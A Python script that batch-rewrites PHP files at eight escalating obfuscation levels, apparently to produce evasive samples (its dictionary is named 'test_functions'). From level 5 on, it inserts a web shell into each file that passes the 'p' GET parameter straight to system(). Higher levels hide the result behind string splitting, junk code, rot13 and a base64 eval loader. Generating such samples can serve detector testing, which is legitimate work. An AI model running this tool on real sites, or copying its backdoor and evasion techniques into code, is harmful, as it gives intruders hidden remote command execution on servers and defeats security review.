import os
import re
import base64
import sys
import codecs
import random
import string

# Obfuscation patterns for dangerous PHP functions
test_functions = {
    "eval": '"e"."v"."a"."l"',
    "assert": '"a"."s"."s"."e"."r"."t"',
    "system": '"s"."y"."s"."t"."e"."m"',
    "exec": '"e"."x"."e"."c"',
    "shell_exec": '"s"."h"."e"."l"."l"."_"."e"."x"."e"."c"',
    "preg_replace": '"p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"',
    "passthru": '"p"."a"."s"."s"."t"."h"."r"."u"',
}

def is_binary_file(filepath):
    try:
        with open(filepath, 'rb') as f:
            return b'\x00' in f.read(1024)
    except Exception:
        return True

def read_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            return f.read()
    except UnicodeDecodeError:
        with open(filepath, 'r', encoding='latin-1') as f:
            return f.read()

def level_0(code, ext):
    return code

def level_1(code, ext):
    result = []
    assigned = set()
    for func in test_functions:
        pattern = re.compile(rf'\b{re.escape(func)}\s*\(', re.IGNORECASE)
        if pattern.search(code):
            var_name = f"__fn_{abs(hash(func)) % 100000}"
            if var_name not in assigned:
                result.append(f'{var_name} = "{func}";')
                assigned.add(var_name)
            code = pattern.sub(f'{var_name}(', code)
    return '\n'.join(result) + '\n' + code

def level_2(code, ext):
    code = level_1(code, ext)
    result = []
    assigned = set()
    for func, obf in test_functions.items():
        pattern = re.compile(rf'\b{re.escape(func)}\s*\(', re.IGNORECASE)
        if pattern.search(code):
            var_name = f"__fn_{abs(hash(func)) % 100000}"
            if var_name not in assigned:
                result.append(f'{var_name} = {obf};')
                assigned.add(var_name)
            code = pattern.sub(f'{var_name}(', code)
    return '\n'.join(result) + '\n' + code

def random_var(prefix="var"):
    suffix = ''.join(random.choices(string.ascii_lowercase, k=5))
    return f"${prefix}_{suffix}"

def level_3(code, ext):
    code = level_2(code, ext)

    # Rename variables and function vars
    var_map = {}
    def rename_var(match):
        orig = match.group(0)
        if orig not in var_map:
            var_map[orig] = random_var("v")
        return var_map[orig]

    # Replace $cmd, $fn_xxx, etc.
    code = re.sub(r'\$[a-zA-Z_][a-zA-Z0-9_]*', rename_var, code)

    # Add comments to each line
    lines = code.splitlines()
    lines = [line + " // obf" if line.strip() else line for line in lines]
    return '\n'.join(lines)

def level_4(code, ext):
    obf_code = level_3(code, ext)
    dummy_vars = "\n".join([
        "$x_fake1 = 1234;",
        "$noise = 'obfuscation'.'test';",
        "$tmp = $x_fake1 * 42;",
        "$flag = false;",
        "$useless = function($v) { return $v . rand(); };",
        "$dummy_check = $useless('xx');"
    ])
    dummy_logic = "\n".join([
        "if ($flag) { echo 'Debug enabled'; }",
        "for ($i = 0; $i < 1; $i++) { $tmp += $i; }",
        "while (false) { echo 'dead loop'; break; }"
    ])
    return dummy_vars + "\n" + dummy_logic + "\n" + obf_code

def level_5(code, ext):
    obf = level_4(code, ext)
    dispatch = "$fmap = array('x1' => 'system', 'x2' => 'passthru');\n"
    call = "$cmd = $_GET['p'];\n$fmap['x1']($cmd);\n"
    return "<?php\n" + dispatch + obf + "\n" + call + "?>"

def level_6(code, ext):
    obf = level_5(code, ext)
    rot13_code = codecs.encode(obf, 'rot_13')
    return (
        "<?php\n"
        "$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';\n"
        "$c = \"" + rot13_code.replace("\"", "\\\"") + "\";\n"
        "eval($f($c));\n"
        "?>"
    )

def level_7(code, ext):
    obf = level_6(code, ext)
    encoded = base64.b64encode(obf.encode('utf-8')).decode('utf-8')
    return (
        "<?php\n"
        '$f = "e"."v"."a"."l";\n'
        '$c = base64_decode("' + encoded + '");\n'
        '$f($c);\n'
        "?>"
    )

obfuscation_levels = {
    'level0': level_0,
    'level1': level_1,
    'level2': level_2,
    'level3': level_3,
    'level4': level_4,
    'level5': level_5,
    'level6': level_6,
    'level7': level_7,
}

def process_file(filepath, input_root, output_root, level):
    if is_binary_file(filepath):
        print(f"[!] Skipped binary file: {filepath}")
        return

    ext = os.path.splitext(filepath)[1].lower()
    if ext != '.php':
        return

    rel_path = os.path.relpath(filepath, input_root)
    out_path = os.path.join(output_root, rel_path)

    code = read_file(filepath)
    transform_func = obfuscation_levels.get(level)
    if transform_func is None:
        print(f"[!] Invalid level: {level}")
        return

    out_code = transform_func(code, ext)
    os.makedirs(os.path.dirname(out_path), exist_ok=True)

    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(out_code)

    print(f"[✓] Saved: {out_path}")

def process_folder(input_root, output_root, level):
    for dirpath, _, filenames in os.walk(input_root):
        for file in filenames:
            if file.lower().endswith('.php'):
                process_file(os.path.join(dirpath, file), input_root, output_root, level)

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 obfuscator.py <input_folder> <output_folder> <level0|level1|...|level7>")
        sys.exit(1)

    input_folder = sys.argv[1]
    output_folder = sys.argv[2]
    selected_level = sys.argv[3].lower()

    process_folder(input_folder, output_folder, selected_level)

